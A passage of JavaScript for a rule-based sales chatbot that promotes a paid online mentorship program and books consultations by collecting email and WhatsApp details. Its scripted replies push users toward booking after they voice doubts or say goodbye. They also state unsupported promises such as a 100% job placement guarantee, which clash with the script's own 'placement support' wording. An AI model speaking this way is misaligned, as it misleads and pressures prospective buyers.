                `I'd love to address you properly! ğŸ˜Š Please enter your real name using only letters (at least 2 characters). For example: <strong>Ahmad Khan</strong> or <strong>Sarah</strong>.

<p style="margin-top:8px; font-size:13px; opacity:0.8;">Type <strong>Skip</strong> to continue without sharing your name.</p>`,

                `That still doesn't look like a valid name. Please use only alphabets, no numbers or special characters. Examples: <strong>Ali</strong>, <strong>Maria</strong>, <strong>John Smith</strong>.

<p style="margin-top:8px; font-size:13px; opacity:0.8;">Type <strong>Skip</strong> to continue. (Attempt ${chatbotState.nameAttempts} of ${chatbotState.maxAttempts})</p>`,

                `Last attempt! Please type your first name or full name using letters only. After this, I'll assign a default name.

<p style="margin-top:8px; font-size:13px; opacity:0.8;">Or type <strong>Skip</strong> to continue right away.</p>`
            ];

            addBotMessage(errorMessages[Math.min(chatbotState.nameAttempts - 1, errorMessages.length - 1)]);
            showSuggestedButtons(["Skip"]);
            return;
        }

        // Valid name
        chatbotState.userName = formatName(name);
        chatbotState.currentStep = 'menu';

        addBotMessage(`Welcome, ${chatbotState.userName}! ğŸ˜Š I'm your dedicated Student Care Assistant for the Champions Mentorship Program. I'm here to help you with:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ“‹ Complete program information and curriculum details</li>
    <li>ğŸ’° Fee structure and payment options</li>
    <li>ğŸ“… Booking a free consultation session</li>
    <li>ğŸ¯ Career guidance and earning potential</li>
    <li>ğŸ“ Enrollment and registration support</li>
</ul>

Feel free to ask anything or choose from the options below!`);

        setTimeout(showTrustFactors, 3000);
    }

    function setDefaultNameAndContinue() {
        chatbotState.userName = 'Valued Student';
        chatbotState.currentStep = 'menu';
        addBotMessage(`No worries at all! I'll address you as <strong>Valued Student</strong> for now. ğŸ˜Š You can share your name anytime during our conversation.

Let me introduce you to the Champions Mentorship Program. It's a career-transforming experience that has helped thousands of students build successful digital careers!`);
        clearSuggestedButtons();
        setTimeout(showTrustFactors, 3000);
    }

    // ==================== MENU SELECTION (SMART ROUTING) ====================

    function handleMenuSelection(selection) {
        const intent = detectIntent(selection);
        const sel = selection.toLowerCase();

        const intentHandlers = {
            'registration': showRegistrationProcess,
            'payment': showPaymentMethods,
            'program': showChampionDetails,
            'curriculum': showCurriculum,
            'career': showCareerOpportunities,
            'fees': showFeeStructure,
            'success': showSuccessStories,
            'ideal': showIdealCandidate,
            'booking': () => {
                if (chatbotState.appointmentBooked) {
                    handleAlreadyBooked();
                } else {
                    startBookingProcess();
                }
            },
            'help': () => {
                addBotMessage(`Of course, ${chatbotState.userName}! I'm here to help with anything related to the Champions Mentorship Program. Here's what I can assist you with:`);
                showMainMenu();
            },
            'website_reviewed': () => {
                addBotMessage(`Excellent, ${chatbotState.userName}! Since you've reviewed the details, let me highlight the key benefits that make this program special.`);
                setTimeout(showChampionDetails, 2000);
            },
            'location': showLocation,
            'duration': showDuration,
            'schedule_info': showScheduleInfo,
            'cancel': handleCancelRequest,
            'menu': () => {
                addBotMessage(`Sure thing, ${chatbotState.userName}! Here's everything I can help you with:`);
                showMainMenu();
            },
            'farewell': handleFarewell,
            'thanks': handleThanks,
            'greeting': () => {
                addBotMessage(`Hello again, ${chatbotState.userName}! ğŸ˜Š Great to see you're still exploring. How can I help you?`);
                showMainMenu();
            },
            'positive': () => {
                addBotMessage(`That's wonderful to hear, ${chatbotState.userName}! ğŸ‰ What would you like to explore next?`);
                showMainMenu();
            },
            'negative': () => {
                addBotMessage(`No problem at all, ${chatbotState.userName}. Take your time! Remember, there's absolutely no pressure. I'm here whenever you need me.`);

                setTimeout(() => {
                    addBotMessage(getRandomItem(freeValueMessages));
                    showMainMenu();
                }, 3000);
            },
            'doubt': handleDoubtAndTrust,
            'compare': handleComparison,
            'refund': handleRefundQuery,
            'language': handleLanguageQuery,
            'certificate': handleCertificateQuery,
            'contact': handleContactQuery,
            'age': handleAgeQuery,
            'prerequisite': handlePrerequisiteQuery,
            'complain': handleComplaint,
            'joke': handleJoke
        };

        if (intentHandlers[intent]) {
            intentHandlers[intent]();
            return;
        }

        // Exact button text matching fallback
        const buttonRoutes = {
            'program details': showChampionDetails,
            'curriculum & modules': showCurriculum,
            'who is this for?': showIdealCandidate,
            'view fee structure': showFeeStructure,
            'career opportunities': showCareerOpportunities,
            'success stories & results': showSuccessStories,
            'how long is the program?': showDuration,
            'where are you located?': showLocation,
            'registration process': showRegistrationProcess,
            'payment methods': showPaymentMethods,
            'book an appointment': () => chatbotState.appointmentBooked ? handleAlreadyBooked() : startBookingProcess(),
            'yes, book free consultation': () => chatbotState.appointmentBooked ? handleAlreadyBooked() : startBookingProcess(),
            'tell me more first': () => { addBotMessage(`Absolutely! Let me show you everything this program offers.`); showChampionDetails(); },
            'continue booking': () => { addBotMessage(`Let's continue where we left off!`); },
            'i need help': () => { addBotMessage(`Of course! What do you need help with?`); showMainMenu(); },
            'back to menu': () => { addBotMessage(`What else can I help you with, ${chatbotState.userName}?`); showMainMenu(); },
            "no, that's all for now": handleFarewell,
            "i've reviewed the website now": () => { addBotMessage(`Perfect! Let me walk you through the program highlights.`); setTimeout(showChampionDetails, 2000); },
            'cancel booking': () => { chatbotState.bookingInProgress = false; chatbotState.currentStep = 'menu'; addBotMessage(`Booking cancelled. No worries, ${chatbotState.userName}!`); showMainMenu(); },
            'skip': () => { if (chatbotState.currentStep === 'greeting') setDefaultNameAndContinue(); }
        };

        if (buttonRoutes[sel]) {
            buttonRoutes[sel]();
            return;
        }

        handleUnknownInput(selection);
    }

    // ==================== SPECIALIZED HANDLERS ====================

    function handleAlreadyBooked() {
        addBotMessage(`You've already booked a consultation, ${chatbotState.userName}! ğŸ‰ We're looking forward to speaking with you on <strong>${chatbotState.appointmentDate}</strong> at <strong>${chatbotState.appointmentTime}</strong>. If you need to reschedule, please reach out via WhatsApp. Is there anything else I can help with?`);
        showMainMenu();
    }

    function handleDoubtAndTrust() {
        addBotMessage(`I completely understand your concerns, ${chatbotState.userName}. Trust is incredibly important, and I appreciate your honesty. Let me address this directly:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ›¡ï¸ <strong>7-Day Money-Back Guarantee:</strong> Try the program risk-free. If you're not satisfied within 7 days, you get a full refund. No questions asked.</li>
    <li>ğŸ’° <strong>Pay-As-You-Go:</strong> You don't have to pay the full fee upfront. Start with just the Rs. 5,000 registration fee and attend 3-4 classes before deciding.</li>
    <li>ğŸ“Š <strong>Proven Track Record:</strong> Over 3,000 students enrolled, 85%+ start earning within 30 days, 4.9/5 satisfaction rating.</li>
    <li>ğŸ’¼ <strong>Job Placement Guarantee:</strong> We're so confident in our program that we guarantee job placement upon completion.</li>
    <li>ğŸ¤ <strong>Lifetime Support:</strong> Your mentor stays with you even after graduation. That's how committed we are to your success.</li>
</ul>

We've designed everything to be completely risk-free because we genuinely believe in the transformative power of this program.`);

        setTimeout(() => {
            addBotMessage(`${chatbotState.userName}, you have absolutely nothing to lose and everything to gain. Would you like to take the first step with a free consultation?`);
            showContextualButtons(["Registration Process", "View Fee Structure"]);
        }, 4000);
    }

    function handleComparison() {
        addBotMessage(`Great question, ${chatbotState.userName}! Here's what makes the Champions Mentorship Program stand out from other courses:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ¯ <strong>1-on-1 Personalized Mentorship</strong> vs. generic pre-recorded courses with no personal attention</li>
    <li>ğŸ“š <strong>15+ Income Streams</strong> vs. single-skill courses that limit your earning potential</li>
    <li>ğŸ’¼ <strong>100% Job Placement Guarantee</strong> vs. "figure it out yourself" approach</li>
    <li>ğŸŒ <strong>Lifetime FREE Web Hosting</strong> (Save Rs. 18,000/year) vs. additional hosting costs</li>
    <li>ğŸ›’ <strong>Zero Platform Fees</strong> (Save $300+/year) vs. monthly Shopify/WooCommerce charges</li>
    <li>ğŸ¤ <strong>Lifetime Mentor Support</strong> vs. time-limited access that expires</li>
    <li>ğŸ’° <strong>Rs. 25,000 One-Time Investment</strong> vs. courses costing $500-$2000+ with fewer benefits</li>
    <li>ğŸ”§ <strong>Real-World Projects</strong> vs. theory-only learning with no practical application</li>
    <li>ğŸ›¡ï¸ <strong>7-Day Risk-Free Trial</strong> vs. no-refund policies</li>
</ul>

The bottom line? You get more value, more skills, more support, and more guarantees at a fraction of the cost.`);

        setTimeout(() => {
            addBotMessage(`Most of our students tell us they wish they had found this program sooner! Ready to experience the difference?`);
            showContextualButtons(["View Fee Structure", "Registration Process", "Success Stories & Results"]);
        }, 4000);
    }

    function handleRefundQuery() {
        addBotMessage(`Absolutely, ${chatbotState.userName}! We offer a clear and hassle-free refund policy:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>âœ… <strong>7-Day Money-Back Guarantee:</strong> If you're not completely satisfied within the first 7 days, we'll refund your entire fee. No questions asked, no fine print.</li>
    <li>âœ… <strong>Try Before You Commit:</strong> Pay only Rs. 5,000 registration fee to start. Attend 3-4 classes. If it's not for you, get your money back.</li>
    <li>âœ… <strong>Zero Risk:</strong> We take on all the risk because we're confident you'll love the program.</li>
</ul>

We believe that if our program doesn't deliver value, we don't deserve your money. It's that simple.`);

        setTimeout(() => {
            addBotMessage(`With this kind of guarantee, you have nothing to lose. Would you like to get started?`);
            showContextualButtons(["Registration Process", "View Fee Structure"]);
        }, 3000);
    }

    function handleLanguageQuery() {
        addBotMessage(`Great question, ${chatbotState.userName}! Our mentorship sessions are conducted in:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ‡¬ğŸ‡§ <strong>English</strong> (primary language for materials and resources)</li>
    <li>ğŸ‡µğŸ‡° <strong>Urdu/Hindi</strong> (for explanations and discussions when needed)</li>
</ul>

Our mentor adapts to your comfort level. If you're more comfortable in Urdu, the concepts will be explained in Urdu while keeping technical terms in English (as they're used globally in the industry). This bilingual approach ensures you understand everything clearly while building industry-standard vocabulary.`);
        showContextualButtons(["Program Details", "Registration Process"]);
    }

    function handleCertificateQuery() {
        addBotMessage(`Yes, ${chatbotState.userName}! Upon successful completion of the Champions Mentorship Program, you'll receive:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ“œ <strong>Certificate of Completion</strong> from the Champions Mentorship Program</li>
    <li>ğŸ“‹ <strong>Professional Portfolio</strong> built during the program with real projects</li>
    <li>ğŸ’¼ <strong>Job Placement Support</strong> where your skills matter more than certificates</li>
    <li>ğŸŒ <strong>Live Project Portfolio</strong> on your own hosted website to showcase to clients</li>
</ul>

In the digital industry, your portfolio and practical skills speak louder than any certificate. Our program ensures you have both!`);
        showContextualButtons(["Career Opportunities", "Registration Process"]);
    }

    function handleContactQuery() {
        addBotMessage(`You can reach us through multiple channels, ${chatbotState.userName}:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ’¬ <strong>WhatsApp:</strong> +92 331 4041010 (Fastest response)</li>
    <li>ğŸ“§ <strong>Email:</strong> Available upon consultation booking</li>
    <li>ğŸ¤– <strong>This Chat:</strong> I'm available 24/7 to answer your questions!</li>
</ul>

The quickest way to get comprehensive answers is to book a free consultation. Would you like to schedule one?`);
        showContextualButtons(["Registration Process"]);
    }

    function handleAgeQuery() {
        addBotMessage(`The Champions Mentorship Program is open to learners of all ages, ${chatbotState.userName}! ğŸŒŸ

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ‘¨â€ğŸ“ <strong>Students (16+):</strong> Build skills alongside your studies and start earning early</li>
    <li>ğŸ‘¨â€ğŸ’¼ <strong>Working Professionals:</strong> Add digital skills to your existing career</li>
    <li>ğŸ‘©â€ğŸ  <strong>Homemakers:</strong> Learn flexible, work-from-home digital skills</li>
    <li>ğŸ‘´ <strong>Career Changers:</strong> Never too late to start a digital career</li>
</ul>

The only requirement is motivation and willingness to learn. Age is never a barrier to success!`);
        showContextualButtons(["Who Is This For?", "Registration Process"]);
    }

    function handlePrerequisiteQuery() {
        addBotMessage(`Here's the honest answer, ${chatbotState.userName}: <strong>No prior experience is needed!</strong> ğŸ¯

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ’» <strong>Technical Skills:</strong> Not required. We start from absolute zero.</li>
    <li>ğŸ“ <strong>Education:</strong> No specific degree needed.</li>
    <li>ğŸ“± <strong>Equipment:</strong> Just a computer/laptop with internet access.</li>
    <li>â° <strong>Time:</strong> 2-3 hours daily (flexible scheduling).</li>
    <li>ğŸ§  <strong>Mindset:</strong> Willingness to learn and take action. That's it!</li>
</ul>

Our 1-on-1 mentorship means the curriculum adapts to YOUR level. Whether you're a complete beginner or have some experience, you'll get personalized attention.

Many of our most successful graduates started with zero technical knowledge!`);

        setTimeout(() => {
            addBotMessage(`The fact that you're asking these questions shows you have the right mindset, ${chatbotState.userName}. That's already half the battle won! ğŸ’ª`);
            showContextualButtons(["Program Details", "Curriculum & Modules", "Registration Process"]);
        }, 3000);
    }

    function handleComplaint() {
        addBotMessage(`I'm sorry to hear you're experiencing difficulties, ${chatbotState.userName}. Your feedback is extremely valuable to us. ğŸ™

Here's what I can do:
<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ“ <strong>Immediate Support:</strong> Contact us on WhatsApp at +92 331 4041010 for priority resolution</li>
    <li>ğŸ“§ <strong>Formal Complaint:</strong> Book a consultation and we'll address your concerns directly</li>
    <li>ğŸ”„ <strong>Refund Policy:</strong> If you're within the 7-day guarantee period, you're eligible for a full refund</li>
</ul>

We take every concern seriously and are committed to making things right. Would you like me to help you connect with our support team?`);
        showSuggestedButtons(["Contact Support via WhatsApp", "Back to Menu"]);
    }

    function handleJoke() {
        const jokes = [
            `ğŸ˜„ Here's one: Why do programmers prefer dark mode? Because light attracts bugs! ğŸ› But seriously, ${chatbotState.userName}, our mentorship is no joke. Want to learn programming and 14 other skills?`,
            `ğŸ˜‚ A freelancer walks into a bar. The bartender says, "That'll be $50." The freelancer replies, "Can I pay in exposure?" ğŸ˜„ With our program, ${chatbotState.userName}, you'll never have to accept exposure as payment!`,
            `ğŸ¤£ Why did the marketer break up with the calendar? Too many dates, not enough quality time! Speaking of dates, ${chatbotState.userName}, want to schedule a free consultation?`
        ];

        addBotMessage(getRandomItem(jokes));
        setTimeout(() => showMainMenu(), 2000);
    }

    function handleCancelRequest() {
        if (chatbotState.bookingInProgress) {
            chatbotState.bookingInProgress = false;
            chatbotState.currentStep = 'menu';
            addBotMessage(`I've cancelled the booking process. No worries at all, ${chatbotState.userName}! You can always book later when you're ready.`);
        } else {
            addBotMessage(`There's no active process to cancel, ${chatbotState.userName}. How else can I help you?`);
        }
        showMainMenu();
    }

    function handleFarewell() {
        const smartCTA = getSmartBookingCTA();

        if (!chatbotState.appointmentBooked && smartCTA) {
            addBotMessage(smartCTA);
            setTimeout(() => {
                addBotMessage(`Either way, it was wonderful chatting with you, ${chatbotState.userName}! ğŸŒŸ Whenever you're ready, I'm just a click away. Wishing you all the best! ğŸš€`);
                showSuggestedButtons(["Book Free Consultation", "Maybe Later"]);
            }, 3000);
        } else if (!chatbotState.appointmentBooked) {
            addBotMessage(`Before you go, ${chatbotState.userName}... ${getRandomItem(urgencyMessages)}`);
            setTimeout(() => {
                addBotMessage(`It was great chatting with you! ğŸŒŸ The Champions Mentorship Program is always here when you're ready. Just click the chat button anytime. Best wishes! ğŸš€`);
                showSuggestedButtons(["Actually, let me book a consultation", "Thanks, goodbye!"]);
            }, 3000);
        } else {
            addBotMessage(`It was wonderful assisting you, ${chatbotState.userName}! ğŸŒŸ We're looking forward to your consultation on <strong>${chatbotState.appointmentDate}</strong> at <strong>${chatbotState.appointmentTime}</strong>. This could be the beginning of an incredible journey! See you soon! ğŸš€`);
            clearSuggestedButtons();
        }
    }

    function handleThanks() {
        addBotMessage(`You're very welcome, ${chatbotState.userName}! ğŸ˜Š It's been my pleasure helping you. Is there anything else you'd like to know about the Champions Mentorship Program?`);

        if (!chatbotState.appointmentBooked) {
            setTimeout(() => {
                addBotMessage(getRandomItem(socialProofMessages));
                showMainMenu();
            }, 2000);
        } else {
            showMainMenu();
        }
    }

    function showScheduleInfo() {
        addBotMessage(`<strong>ğŸ“… Class Schedule Information</strong>

The Champions Mentorship Program offers maximum flexibility:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ“† <strong>Days:</strong> You choose which days work for you</li>
    <li>â° <strong>Timing:</strong> Sessions scheduled at your convenience</li>
    <li>â±ï¸ <strong>Session Length:</strong> 1-2 hours per session</li>
    <li>ğŸ”„ <strong>Rescheduling:</strong> Easily reschedule if something comes up</li>
    <li>ğŸ“¹ <strong>Format:</strong> Live 1-on-1 video sessions</li>
    <li>ğŸŒ <strong>Timezone:</strong> Adjusted to your local timezone</li>
</ul>

Unlike rigid classroom schedules, our program works around YOUR life, not the other way around!`);
        showContextualButtons(["View Fee Structure", "Registration Process"]);
    }

    function showDuration() {
        addBotMessage(`<strong>â±ï¸ Program Duration</strong>

The Champions Mentorship Program is designed to be completed in <strong>less than 2 months</strong>:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li><strong>Format:</strong> 1-on-1 personalized sessions</li>
    <li><strong>Schedule:</strong> You choose your days and times</li>
    <li><strong>Pace:</strong> Adapts to your learning speed</li>
    <li><strong>Accelerated Option:</strong> Complete in 4-6 weeks with daily sessions</li>
    <li><strong>Relaxed Option:</strong> Take up to 3 months with fewer weekly sessions</li>
    <li><strong>Post-Completion:</strong> Lifetime access to materials and ongoing support</li>
</ul>

The program adapts to YOUR schedule and learning speed. Some motivated students complete it in just 5 weeks!`);
        showContextualButtons(["View Fee Structure", "Registration Process"]);
    }

    function showLocation() {
        addBotMessage(`<strong>ğŸŒ Program Location</strong>

The Champions Mentorship Program is <strong>100% online</strong>. You can join from anywhere in the world!

<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ  Learn from the comfort of your home</li>
    <li>ğŸŒ Students from 15+ countries already enrolled</li>
    <li>ğŸ“¹ Professional video conferencing tools</li>
    <li>â° Sessions adjusted to your timezone</li>
    <li>ğŸ’» All you need is a computer and internet</li>
</ul>

Your home is your classroom, and the world is your marketplace!`);
        showContextualButtons(["Registration Process"]);
    }

    function handleUnknownInput(message) {
        const suggestions = [
            `I want to make sure I give you the best answer, ${chatbotState.userName}. Could you try rephrasing your question, or select from the options below?`,
            `I'm not quite sure what you're looking for, ${chatbotState.userName}. Here are the topics I'm an expert in:`,
            `Let me redirect you to the right information, ${chatbotState.userName}. Please choose from these options:`,
            `I may have misunderstood your question, ${chatbotState.userName}. Here's everything I can help you with:`
        ];

        addBotMessage(getRandomItem(suggestions));

        // Add a helpful tip
        setTimeout(() => {
            addBotMessage(`ğŸ’¡ <strong>Pro tip:</strong> You can ask me about fees, curriculum, career opportunities, registration, or simply type "book" to schedule a free consultation!`);
            chatbotState.currentStep = 'menu';
            showMainMenu();
        }, 2000);
    }

    // ==================== BOOKING FLOW ====================

    function startBookingProcess() {
        chatbotState.currentStep = 'email';
        chatbotState.bookingInProgress = true;
        chatbotState.emailAttempts = 0;
        chatbotState.phoneAttempts = 0;

        addBotMessage(`Excellent decision, ${chatbotState.userName}! ğŸ‰ Let's schedule your free consultation. This is a no-obligation call where you'll get personalized guidance.

I'll need just 3 quick details. First, what's your email address?`);
        clearSuggestedButtons();
    }

    function handleEmailInput(email) {
        chatbotState.emailAttempts++;

        // Check if user wants to cancel
        const intent = detectIntent(email);
        if (intent === 'cancel' || intent === 'menu') {
            chatbotState.bookingInProgress = false;
            chatbotState.currentStep = 'menu';
            addBotMessage(`No problem! I've cancelled the booking. What else can I help you with?`);
            showMainMenu();
            return;
        }

        if (!isValidEmail(email)) {
            if (chatbotState.emailAttempts >= chatbotState.maxAttempts) {
                addBotMessage(`It seems we're having trouble with the email. No worries! You can complete your booking directly via WhatsApp at <strong>+92 331 4041010</strong>. Just send a message saying you'd like to book a consultation.`);
                chatbotState.bookingInProgress = false;
                chatbotState.currentStep = 'menu';
                showSuggestedButtons(["Contact via WhatsApp", "Try Again", "Back to Menu"]);
                return;
            }

            const emailErrors = [
                `That doesn't look like a valid email address. Please check and try again. Example: <strong>yourname@gmail.com</strong>
<p style="margin-top:5px; font-size:13px; opacity:0.8;">Attempt ${chatbotState.emailAttempts} of ${chatbotState.maxAttempts}. Type <strong>cancel</strong> to stop.</p>`,
                `Still not a valid email. Make sure it includes @ and a domain. Examples: <strong>student@gmail.com</strong>, <strong>name@yahoo.com</strong>
<p style="margin-top:5px; font-size:13px; opacity:0.8;">Attempt ${chatbotState.emailAttempts} of ${chatbotState.maxAttempts}. Type <strong>cancel</strong> to stop.</p>`,
                `Last attempt! Please enter a valid email address. If you're having trouble, type <strong>cancel</strong> and we can help you via WhatsApp instead.`
            ];

            addBotMessage(emailErrors[Math.min(chatbotState.emailAttempts - 1, emailErrors.length - 1)]);
            return;
        }

        chatbotState.userEmail = email;
        chatbotState.currentStep = 'whatsapp';
        addBotMessage(`Great! Now, please share your WhatsApp number with country code. We'll use it for session reminders and important updates. Example: <strong>+923001234567</strong>`);
    }

    function handleWhatsappInput(whatsapp) {
        chatbotState.phoneAttempts++;

        // Check if user wants to cancel
        const intent = detectIntent(whatsapp);
        if (intent === 'cancel' || intent === 'menu') {
            chatbotState.bookingInProgress = false;
            chatbotState.currentStep = 'menu';
            addBotMessage(`Booking cancelled. What else can I help you with, ${chatbotState.userName}?`);
            showMainMenu();
            return;
        }

        if (!isValidPhone(whatsapp)) {
            if (chatbotState.phoneAttempts >= chatbotState.maxAttempts) {
                addBotMessage(`It seems we're having trouble with the phone number. You can complete your booking directly via WhatsApp at <strong>+92 331 4041010</strong>.`);
                chatbotState.bookingInProgress = false;
                chatbotState.currentStep = 'menu';
                showSuggestedButtons(["Contact via WhatsApp", "Try Again", "Back to Menu"]);
                return;
            }

            const phoneErrors = [
                `That doesn't look like a valid phone number. Please include your country code. Example: <strong>+923001234567</strong>
<p style="margin-top:5px; font-size:13px; opacity:0.8;">Attempt ${chatbotState.phoneAttempts} of ${chatbotState.maxAttempts}. Type <strong>cancel</strong> to stop.</p>`,
                `Still not valid. Make sure it's 10-15 digits with optional + prefix. Example: <strong>+923331234567</strong>
<p style="margin-top:5px; font-size:13px; opacity:0.8;">Attempt ${chatbotState.phoneAttempts} of ${chatbotState.maxAttempts}.</p>`,
                `Last attempt! Enter a valid WhatsApp number, or type <strong>cancel</strong> to book via WhatsApp directly.`
            ];

            addBotMessage(phoneErrors[Math.min(chatbotState.phoneAttempts - 1, phoneErrors.length - 1)]);
            return;
        }

        chatbotState.userWhatsapp = whatsapp;
        chatbotState.currentStep = 'date';
        addBotMessage(`Excellent! Almost done. Please select your preferred consultation date:`);
        showSuggestedButtons(generateDateOptions(7));
    }

    function handleDateInput(date) {
        // Validate date is one of the generated options
        const validDates = generateDateOptions(7);
        if (!validDates.includes(date)) {
            addBotMessage(`Please select a valid date from the options below:`);
            showSuggestedButtons(validDates);
            return;
        }

        chatbotState.appointmentDate = date;
        chatbotState.currentStep = 'time';
        addBotMessage(`You've selected <strong>${date}</strong>. Now choose your preferred time slot:`);
        showSuggestedButtons(["9:00 AM", "10:00 AM", "11:00 AM", "1:00 PM", "2:00 PM", "3:00 PM", "4:00 PM", "5:00 PM"]);
    }

    function handleTimeInput(time) {
        const validTimes = ["9:00 AM", "10:00 AM", "11:00 AM", "1:00 PM", "2:00 PM", "3:00 PM", "4:00 PM", "5:00 PM"];
        if (!validTimes.includes(time)) {
            addBotMessage(`Please select a valid time slot from the options below:`);
            showSuggestedButtons(validTimes);
            return;
        }

        chatbotState.appointmentTime = time;
        chatbotState.currentStep = 'confirmation';

        addBotMessage(`Perfect! Here's your consultation summary:

<ul style="margin-left: 20px; padding-left: 10px;">
    <li><strong>Name:</strong> ${chatbotState.userName}</li>
    <li><strong>Email:</strong> ${chatbotState.userEmail}</li>
    <li><strong>WhatsApp:</strong> ${chatbotState.userWhatsapp}</li>
    <li><strong>Date:</strong> ${chatbotState.appointmentDate}</li>
    <li><strong>Time:</strong> ${chatbotState.appointmentTime}</li>
    <li><strong>Program:</strong> Champions Mentorship Program</li>
    <li><strong>Type:</strong> Free Consultation (No Obligation)</li>
</ul>

<p>Does everything look correct?</p>`);

        showSuggestedButtons(["âœ… Yes, confirm appointment", "âŒ No, make changes"]);
    }

    function handleConfirmation(response) {
        const intent = detectIntent(response);

        if (intent === 'positive' || response.toLowerCase().includes('confirm') || response.toLowerCase().includes('yes')) {
            chatbotState.appointmentBooked = true;
            chatbotState.bookingInProgress = false;
            chatbotState.currentStep = 'menu';

            addBotMessage("ğŸ‰ Congratulations! Your free consultation has been booked successfully!");

            setTimeout(() => {
                addBotMessage(`${chatbotState.userName}, you've just taken the most important step toward your new career! Here's what happens next:

<ol style="margin-left: 20px; padding-left: 10px;">
    <li>You'll receive a confirmation message on WhatsApp</li>
    <li>On ${chatbotState.appointmentDate} at ${chatbotState.appointmentTime}, you'll have a 1-on-1 call</li>
    <li>You'll get personalized guidance on your learning path</li>
    <li>All your questions will be answered directly</li>
</ol>

Please confirm your appointment via WhatsApp to complete the process.`);

                setTimeout(() => {
                    showAppointmentSummary();
                }, 2000);
            }, 2000);

        } else if (intent === 'negative' || response.toLowerCase().includes('no') || response.toLowerCase().includes('change')) {
            addBotMessage(`No problem! Let's update your booking details. What would you like to change?`);
            showSuggestedButtons(["Change Date", "Change Time", "Change Email", "Change WhatsApp", "Start Over", "Cancel Booking"]);
            chatbotState.currentStep = 'menu';

            // Override menu for change handling
            const originalHandler = handleMenuSelection;
            handleMenuSelection = function(sel) {
                const s = sel.toLowerCase();
                if (s.includes('change date')) { chatbotState.currentStep = 'date'; addBotMessage('Select a new date:'); showSuggestedButtons(generateDateOptions(7)); }
                else if (s.includes('change time')) { chatbotState.currentStep = 'time'; addBotMessage('Select a new time:'); showSuggestedButtons(["9:00 AM", "10:00 AM", "11:00 AM", "1:00 PM", "2:00 PM", "3:00 PM", "4:00 PM", "5:00 PM"]); }
                else if (s.includes('change email')) { chatbotState.currentStep = 'email'; chatbotState.emailAttempts = 0; addBotMessage('Please enter your new email address:'); clearSuggestedButtons(); }
                else if (s.includes('change whatsapp')) { chatbotState.currentStep = 'whatsapp'; chatbotState.phoneAttempts = 0; addBotMessage('Please enter your new WhatsApp number:'); clearSuggestedButtons(); }
                else if (s.includes('start over')) { startBookingProcess(); }
                else if (s.includes('cancel')) { chatbotState.bookingInProgress = false; chatbotState.currentStep = 'menu'; handleMenuSelection = originalHandler; addBotMessage('Booking cancelled.'); showMainMenu(); }
                else { handleMenuSelection = originalHandler; originalHandler(sel); }
            };
        } else {
            addBotMessage(`I need a clear response to proceed, ${chatbotState.userName}. Would you like to confirm your appointment?`);
            showSuggestedButtons(["âœ… Yes, confirm", "âŒ No, make changes", "Cancel Booking"]);
        }
    }

    function showAppointmentSummary() {
        const summaryDiv = document.createElement('div');
        summaryDiv.className = 'appointment-summary';
        summaryDiv.innerHTML = `
            <h4>ğŸ“‹ Appointment Confirmed!</h4>
            <div class="summary-content">
                <p><strong>Name:</strong> ${chatbotState.userName}</p>
                <p><strong>Email:</strong> ${chatbotState.userEmail}</p>
                <p><strong>WhatsApp:</strong> ${chatbotState.userWhatsapp}</p>
                <p><strong>Date:</strong> ${chatbotState.appointmentDate}</p>
                <p><strong>Time:</strong> ${chatbotState.appointmentTime}</p>
                <p><strong>Program:</strong> Champions Mentorship Program</p>
                <p><strong>Type:</strong> Free Consultation</p>
            </div>
            <p class="share-instruction">âš¡ Please confirm via WhatsApp to complete your booking</p>
            <button class="whatsapp-btn" onclick="shareOnWhatsApp()">
                <i class="fab fa-whatsapp"></i> Confirm on WhatsApp
            </button>
        `;

        chatbotMessages.appendChild(summaryDiv);
        chatbotMessages.scrollTop = chatbotMessages.scrollHeight;

        setTimeout(() => {
            addBotMessage(`${getRandomItem(socialProofMessages)}

Is there anything else you'd like to know, ${chatbotState.userName}?`);

            showSuggestedButtons([
                "Program Details",
                "Curriculum & Modules",
                "Career Opportunities",
                "Registration Process",
                "Payment Methods",
                "No, that's all for now"
            ]);
        }, 3000);
    }

    // ==================== WEBSITE READING FLOW ====================

    function handleWebsiteReadingResponse(response) {
        chatbotState.currentStep = 'menu';
        const intent = detectIntent(response);

        if (intent === 'positive' || response.toLowerCase().includes('reviewed') || response.toLowerCase().includes('yes')) {
            addBotMessage(`Fantastic, ${chatbotState.userName}! ğŸ‰ Since you're already familiar with the program details, you're one step closer to starting your journey. Let me highlight the key benefits that students love the most.`);
            setTimeout(showChampionDetails, 2000);
        } else {
            addBotMessage(`Take all the time you need, ${chatbotState.userName}! Meanwhile, I can walk you through the key highlights right here. What would you like to know more about?`);

            setTimeout(() => {
                addBotMessage(getRandomItem(freeValueMessages));
                showSuggestedButtons([
                    "Program Details",
                    "Curriculum & Modules",
                    "Who Is This For?",
                    "View Fee Structure",
                    "Career Opportunities",
                    "I've reviewed the website now"
                ]);
            }, 3000);
        }
    }

    function handleAppointmentInterest(response) {
        chatbotState.currentStep = 'menu';
        const intent = detectIntent(response);

        if (intent === 'positive') {
            startBookingProcess();
        } else {
            addBotMessage(`Absolutely no pressure, ${chatbotState.userName}! Take your time exploring. The consultation is free and no-obligation whenever you're ready.`);

            setTimeout(() => {
                addBotMessage(getRandomItem(socialProofMessages));
                showMainMenu();
            }, 3000);
        }
    }

    // ==================== CONTENT DISPLAY FUNCTIONS ====================

    function showChampionDetails() {
        chatbotState.hasSeenProgram = true;

        addBotMessage(`<strong>ğŸ† Champions Mentorship Program</strong>

A comprehensive, career-transforming mentorship designed to equip you with 15+ digital income streams and professional-grade skills.

<strong>What You Get:</strong>
<ul style="margin-left: 20px; padding-left: 10px;">
    <li>ğŸ¯ Personalized 1-on-1 sessions with flexible scheduling</li>
    <li>ğŸ“š Mastery of 15+ in-demand digital skills</li>
    <li>ğŸ’¼ 100% guaranteed job placement upon completion</li>
